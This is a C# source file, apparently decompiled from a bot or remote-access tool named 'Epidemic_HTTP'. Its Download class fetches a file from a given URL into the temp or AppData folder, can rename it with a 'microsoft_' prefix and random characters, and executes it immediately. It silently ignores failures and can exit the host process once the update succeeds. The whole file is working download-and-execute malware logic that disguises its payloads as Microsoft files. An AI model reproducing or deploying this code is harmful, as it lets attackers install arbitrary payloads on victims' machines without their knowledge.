using System;
using System.Diagnostics;
using System.IO;
using System.Net;

namespace Epidemic_HTTP;

internal class Download
{
	private string fileURL;

	private string fileName;

	private bool update;

	public Download(string f_fileURL, string f_fileName, bool f_update)
	{
		fileURL = f_fileURL;
		fileName = f_fileName;
		update = f_update;
	}

	public void DownloadFile()
	{
		try
		{
			if (fileName.StartsWith("*"))
			{
				string text = fileName.Split(new char[1] { '*' })[1];
				fileName = "microsoft_" + Functions.RandomString(10, lowerCase: true) + text;
			}
			if (File.Exists(Path.GetTempPath() + fileName))
			{
				File.Delete(Path.GetTempPath() + fileName);
			}
			try
			{
				WebClient webClient = new WebClient();
				webClient.DownloadFile(fileURL, Path.GetTempPath() + fileName);
				Process.Start(Path.GetTempPath() + fileName);
			}
			catch
			{
			}
			if (!File.Exists(Path.GetTempPath() + fileName))
			{
				try
				{
					WebClient webClient = new WebClient();
					webClient.DownloadFile(fileURL, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + fileName);
					Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + fileName);
				}
				catch
				{
				}
			}
			bool flag = false;
			if (File.Exists(Path.GetTempPath() + fileName) || File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + fileName))
			{
				flag = true;
			}
			if (update && flag)
			{
				Environment.Exit(0);
			}
		}
		catch (Exception ex)
		{
			Functions.ReportError(Functions.GetMethodName("{0}"), ex.Message, ex.StackTrace);
		}
	}
}
